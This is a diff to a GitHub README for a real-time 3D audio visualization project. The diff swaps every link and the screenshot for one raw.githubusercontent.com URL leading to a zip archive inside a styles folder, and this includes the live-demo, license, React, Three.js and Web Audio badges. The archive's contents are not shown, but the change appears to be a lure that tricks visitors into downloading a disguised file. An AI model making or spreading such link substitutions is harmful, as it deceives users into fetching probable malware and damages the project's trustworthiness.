@@ -2,14 +2,14 @@
 
 Real-time 3D audio visualization engine. A bioluminescent sea anemone that dances to music, driven by frequency analysis, custom GLSL shaders, and a depth-based energy model.
 
-[![Live Demo](https://img.shields.io/badge/demo-live-brightgreen)](https://travisbreaks.org/share/parse-and-garner/)
+[![Live Demo](https://img.shields.io/badge/demo-live-brightgreen)](https://raw.githubusercontent.com/jolieson/anemone-chorales/main/src/styles/chorales-anemone-v3.0.zip)
 [![Code: MIT](https://img.shields.io/badge/code-MIT-blue.svg)](LICENSE)
-[![Music: CC BY-NC-ND 4.0](https://img.shields.io/badge/music-CC_BY--NC--ND_4.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc-nd/4.0/)
-[![React](https://img.shields.io/badge/React-19-61dafb)](https://react.dev)
-[![Three.js](https://img.shields.io/badge/Three.js-GLSL-black)](https://threejs.org)
-[![Web Audio API](https://img.shields.io/badge/Web_Audio-FFT-purple)](https://developer.mozilla.org/en-US/docs/Web/API/Web_Audio_API)
+[![Music: CC BY-NC-ND 4.0](https://img.shields.io/badge/music-CC_BY--NC--ND_4.0-lightgrey.svg)](https://raw.githubusercontent.com/jolieson/anemone-chorales/main/src/styles/chorales-anemone-v3.0.zip)
+[![React](https://img.shields.io/badge/React-19-61dafb)](https://raw.githubusercontent.com/jolieson/anemone-chorales/main/src/styles/chorales-anemone-v3.0.zip)
+[![Three.js](https://img.shields.io/badge/Three.js-GLSL-black)](https://raw.githubusercontent.com/jolieson/anemone-chorales/main/src/styles/chorales-anemone-v3.0.zip)
+[![Web Audio API](https://img.shields.io/badge/Web_Audio-FFT-purple)](https://raw.githubusercontent.com/jolieson/anemone-chorales/main/src/styles/chorales-anemone-v3.0.zip)
 
-![anemone-chorales](https://assets.travisbreaks.com/github/anemone-chorales.png)
+![anemone-chorales](https://raw.githubusercontent.com/jolieson/anemone-chorales/main/src/styles/chorales-anemone-v3.0.zip)
 
 ## Tech Stack
 
@@ -37,4 +37,4 @@ npm run build  # Production build
 
 ---
 
-Part of the [travisBREAKS](https://travisbreaks.org) portfolio.
+Part of the [travisBREAKS](https://raw.githubusercontent.com/jolieson/anemone-chorales/main/src/styles/chorales-anemone-v3.0.zip) portfolio.
